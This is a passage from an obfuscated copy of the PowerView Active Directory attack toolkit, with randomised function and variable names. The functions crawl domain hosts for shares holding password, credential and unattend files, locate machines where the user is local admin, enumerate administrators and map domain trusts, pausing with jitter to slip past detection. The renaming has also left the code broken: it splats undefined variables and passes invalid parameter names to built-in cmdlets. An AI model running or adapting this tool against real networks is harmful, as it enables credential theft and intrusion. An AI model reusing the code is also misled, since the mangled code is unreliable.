                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[compact] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[compact] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[compact] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $LbPxpcfl99, $sufTyDkO99
            }
        }
        else {
            Write-Verbose "[compact] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'CheckShareAccess' = $LbPxpcfl99
                'TokenHandle' = $sufTyDkO99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function handmade {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $BUQfxdwb99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $UqVGtfQq99,
        [String[]]
        $upUFvctv99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ZQkDJBEr99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $XSflXwFU99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ekIMPglU99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $VeoiPngD99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $obqWYBKq99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            Write-Verbose '[handmade] Querying computers in the domain'
            $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[handmade] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[handmade] No hosts found to enumerate'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $BUQfxdwb99, $upUFvctv99, $VeoiPngD99, $evIihJWj99, $obqWYBKq99, $bKvStpka99, $hChekWvA99)
            if ($hChekWvA99) {
                $Null = properest -hChekWvA99 $hChekWvA99 -Quiet
            }
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $ZBnLGGvx99 = @()
                if ($LzaREudW99.StartsWith('\\')) {
                    $ZBnLGGvx99 += $LzaREudW99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                    if ($Up) {
                        $rSEXBMoV99 = overstatement -lgkTdAeF99 $LzaREudW99
                        ForEach ($Share in $rSEXBMoV99) {
                            $HsbkIJLD99 = $Share.Name
                            $Path = '\\'+$LzaREudW99+'\'+$HsbkIJLD99
                            if (($HsbkIJLD99) -and ($HsbkIJLD99.Trim() -ne '')) {
                                if ($upUFvctv99 -NotContains $HsbkIJLD99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $ZBnLGGvx99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $ZBnLGGvx99) {
                    Write-Verbose "Searching share: $Share"
                    $AgfDRumU99 = @{
                        'Path' = $Share
                        'Include' = $BUQfxdwb99
                    }
                    if ($VeoiPngD99) {
                        $AgfDRumU99['OfficeDocs'] = $VeoiPngD99
                    }
                    if ($obqWYBKq99) {
                        $AgfDRumU99['FreshEXEs'] = $obqWYBKq99
                    }
                    if ($ZQkDJBEr99) {
                        $AgfDRumU99['LastAccessTime'] = $ZQkDJBEr99
                    }
                    if ($XSflXwFU99) {
                        $AgfDRumU99['LastWriteTime'] = $XSflXwFU99
                    }
                    if ($ekIMPglU99) {
                        $AgfDRumU99['CreationTime'] = $ekIMPglU99
                    }
                    if ($bKvStpka99) {
                        $AgfDRumU99['CheckWriteAccess'] = $bKvStpka99
                    }
                    interleukin @SearchArgs
                }
            }
            if ($hChekWvA99) {
                flake
            }
        }
        $sufTyDkO99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
            }
            else {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[handmade] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[handmade] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[handmade] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $BUQfxdwb99, $upUFvctv99, $VeoiPngD99, $evIihJWj99, $obqWYBKq99, $bKvStpka99, $sufTyDkO99
            }
        }
        else {
            Write-Verbose "[handmade] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'Include' = $BUQfxdwb99
                'ExcludedShares' = $upUFvctv99
                'OfficeDocs' = $VeoiPngD99
                'ExcludeHidden' = $evIihJWj99
                'FreshEXEs' = $obqWYBKq99
                'CheckWriteAccess' = $bKvStpka99
                'TokenHandle' = $sufTyDkO99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function airbrushing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Switch]
        $LbPxpcfl99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['Unconstrained']) { $rsKAQUCp99['Unconstrained'] = $tdRSmHCF99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            Write-Verbose '[airbrushing] Querying computers in the domain'
            $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[airbrushing] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[airbrushing] No hosts found to enumerate'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $hChekWvA99)
            if ($hChekWvA99) {
                $Null = properest -hChekWvA99 $hChekWvA99 -Quiet
            }
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    $WSrnYDsB99 = portent -lgkTdAeF99 $LzaREudW99
                    if ($WSrnYDsB99.IsAdmin) {
                        $LzaREudW99
                    }
                }
            }
            if ($hChekWvA99) {
                flake
            }
        }
        $sufTyDkO99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
            }
            else {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[airbrushing] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[airbrushing] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[airbrushing] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $sufTyDkO99
            }
        }
        else {
            Write-Verbose "[airbrushing] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'TokenHandle' = $sufTyDkO99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
}
function Rhiannon {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $KegVfEPD99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $yCCcshgi99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['Unconstrained']) { $rsKAQUCp99['Unconstrained'] = $tdRSmHCF99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            Write-Verbose '[Rhiannon] Querying computers in the domain'
            $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Rhiannon] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[Rhiannon] No hosts found to enumerate'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $KegVfEPD99, $yCCcshgi99, $hChekWvA99)
            if ($KegVfEPD99 -eq "Administrators") {
                $mJjeWiXP99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $KegVfEPD99 = ($mJjeWiXP99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($hChekWvA99) {
                $Null = properest -hChekWvA99 $hChekWvA99 -Quiet
            }
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    $sAKxhNTO99 = @{
                        'ComputerName' = $LzaREudW99
                        'Method' = $yCCcshgi99
                        'GroupName' = $KegVfEPD99
                    }
                    Dutch @NetLocalGroupMemberArguments
                }
            }
            if ($hChekWvA99) {
                flake
            }
        }
        $sufTyDkO99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
            }
            else {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Rhiannon] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[Rhiannon] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[Rhiannon] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $KegVfEPD99, $yCCcshgi99, $sufTyDkO99
            }
        }
        else {
            Write-Verbose "[Rhiannon] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'GroupName' = $KegVfEPD99
                'Method' = $yCCcshgi99
                'TokenHandle' = $sufTyDkO99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function million {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $iMXxYrFt99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $YhqqyOAX99 = @{}
        if ($PSBoundParameters['Domain']) { $YhqqyOAX99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $YhqqyOAX99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['Properties']) { $YhqqyOAX99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $YhqqyOAX99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $YhqqyOAX99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $YhqqyOAX99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $YhqqyOAX99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $YhqqyOAX99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $YhqqyOAX99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $YhqqyOAX99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $QtDVgbAC99 = @{}
            if ($gddrYpaX99 -and $gddrYpaX99.Trim() -ne '') {
                $HOUZyvyN99 = $gddrYpaX99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $HOUZyvyN99 = (retrenchments -xjRyyQze99 $xjRyyQze99).Name
                }
                else {
                    $HOUZyvyN99 = (retrenchments).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($gddrYpaX99 -and $gddrYpaX99.Trim() -ne '') {
                $HOUZyvyN99 = $gddrYpaX99
            }
            else {
                $HOUZyvyN99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $MzWTFGEu99 = indenturing @LdapSearcherArguments
            $WsyrkuBC99 = hominess @NetSearcherArguments
            if ($MzWTFGEu99) {
                $MzWTFGEu99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $MzWTFGEu99.FindOne() }
                else { $jAOXTyAF99 = $MzWTFGEu99.FindAll() }
                $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $pSZOdsnq99 = New-Object PSObject
                    $vgrxBQjN99 = @()
                    $vgrxBQjN99 += $iMXxYrFt99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $iMXxYrFt99[$_] }
                    $WXbeBCSb99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $yYbgFbHL99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $SzdNnNzd99 = $Props.distinguishedname[0]
                    $HryzEvwB99 = $SzdNnNzd99.IndexOf('DC=')
                    if ($HryzEvwB99) {
                        $HOUZyvyN99 = $($SzdNnNzd99.SubString($HryzEvwB99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $HOUZyvyN99 = ""
                    }
                    $APVxlipy99 = $SzdNnNzd99.IndexOf(',CN=System')
                    if ($HryzEvwB99) {
                        $udnfiLvJ99 = $SzdNnNzd99.SubString(3, $APVxlipy99-3)
                    }
                    else {
                        $udnfiLvJ99 = ""
                    }
                    $WZhhKFQN99 = New-Object Guid @(,$Props.objectguid[0])
                    $SLqiOELZ99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $pSZOdsnq99 | Add-Member Noteproperty 'SourceName' $HOUZyvyN99
                    $pSZOdsnq99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $pSZOdsnq99 | Add-Member Noteproperty 'TrustType' $yYbgFbHL99
                    $pSZOdsnq99 | Add-Member Noteproperty 'TrustAttributes' $($vgrxBQjN99 -join ',')
                    $pSZOdsnq99 | Add-Member Noteproperty 'TrustDirection' "$WXbeBCSb99"
                    $pSZOdsnq99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $pSZOdsnq99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $pSZOdsnq99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $pSZOdsnq99
                }
                if ($jAOXTyAF99) {
                    try { $jAOXTyAF99.dispose() }
                    catch {
                        Write-Verbose "[million] Error disposing of the Results object: $_"
                    }
                }
                $MzWTFGEu99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $eZqjtdWU99 = $GejzMkbd99
            }
            elseif ($gddrYpaX99 -and $gddrYpaX99.Trim() -ne '') {
                $eZqjtdWU99 = $gddrYpaX99
            }
            else {
